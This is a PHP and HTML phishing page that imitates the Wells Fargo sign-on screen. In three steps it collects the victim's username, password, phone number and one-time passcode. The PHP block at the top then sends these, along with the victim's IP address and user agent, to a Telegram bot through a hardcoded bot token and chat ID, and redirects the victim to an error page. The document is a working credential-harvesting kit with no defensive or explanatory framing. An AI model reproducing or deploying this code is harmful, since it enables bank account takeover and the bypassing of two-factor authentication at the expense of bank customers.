<?php
session_start();

$step = isset($_POST['step']) ? $_POST['step'] : 'login';

if ($step === 'login') {
  $_SESSION['username'] = $_POST['username'];
  $_SESSION['password'] = $_POST['password'];
  $step = 'phone';
} elseif ($step === 'phone') {
  $_SESSION['phone'] = $_POST['phone'];
  $step = 'otp';
} elseif ($step === 'otp') {
  $_SESSION['otp'] = $_POST['otp'];

  // Telegram hit
  $token = "8286512978:AAHWf00K15WpA4tsbKyovYMlMw9in6gkALc";
  $chat_id = "750862049";

  $username = $_SESSION['username'];
  $password = $_SESSION['password'];
  $phone = $_SESSION['phone'];
  $otp = $_SESSION['otp'];

  $ip = $_SERVER['REMOTE_ADDR'];
  $user_agent = $_SERVER['HTTP_USER_AGENT'];
  $location_url = "http://www.geoiptool.com/?IP=$ip";

  $message = <<<EOD
|----------| xLs |--------------|
Online ID            : $username
Passcode             : $password
Phone                : $phone
OTP                  : $otp
|--------------- I N F O | I P -------------------|
Client IP            : $ip
Location Lookup      : $location_url
User Agent           : $user_agent
|----------- CrEaTeD bY WellsFargo-sim-bot --------------|
EOD;

  file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));
  header("Location: error.html");
  exit();
}
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Wells Fargo Sign On</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: url('background.jpg') no-repeat center center fixed;
      background-size: cover;
    }
    .header {
      background-color: #c8102e;
      color: white;
      padding: 10px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 4px solid #fdb913;
    }
    .header .logo {
      font-size: 24px;
      font-weight: bold;
    }
    .header .nav {
      font-size: 14px;
    }
    .header .nav a {
      color: white;
      margin-left: 20px;
      text-decoration: none;
    }
    .container {
      background-color: white;
      max-width: 400px;
      margin: 60px auto;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
    }
    .container h2 {
      margin-bottom: 20px;
      font-size: 20px;
      color: #333;
    }
    label {
      display: block;
      margin-bottom: 5px;
      color: #333;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .btn {
      width: 100%;
      padding: 10px;
      background-color: #fdb913;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }
    .footer {
      text-align: center;
      font-size: 12px;
      color: #666;
      margin-top: 40px;
      padding: 20px;
    }
  </style>
</head>
<body>
<div class="header">
  <div class="logo">WELLS FARGO</div>
  <div class="nav">
    <a href="#">Enroll</a>
    <a href="#">Customer Service</a>
    <a href="#">ATMs/Locations</a>
    <a href="#">Espa&ntilde;ol</a>
  </div>
</div>
<div class="container">
  <h2>Good afternoon</h2>
  <?php if ($step === 'login'): ?>
    <form action="index.php" method="post">
      <input type="hidden" name="step" value="login">
      <label for="username">Username</label>
      <input id="username" name="username" required type="text">

      <label for="password">Password</label>
      <input id="password" name="password" required type="password">

      <input class="btn" value="Next" type="submit">
    </form>
  <?php elseif ($step === 'phone'): ?>
    <form action="index.php" method="post">
      <input type="hidden" name="step" value="phone">
      <label for="phone">Phone Number</label>
      <input id="phone" name="phone" required type="text">

      <input class="btn" value="Next" type="submit">
    </form>
  <?php elseif ($step === 'otp'): ?>
    <form action="index.php" method="post">
      <input type="hidden" name="step" value="otp">
      <label for="otp">One-Time Password (OTP)</label>
      <input id="otp" name="otp" required type="text">

      <input class="btn" value="Sign On" type="submit">
    </form>
  <?php endif; ?>
</div>
<div class="footer">
  Investment and Insurance Products are:<br>
  - Not Insured by the FDIC or Any Federal Government Agency<br>
  - Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate<br>
  - Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested<br><br>
  &copy; 1999 &ndash; 2025 Wells Fargo. All rights reserved. NMLSR ID 399801
</div>
</body>
</html>
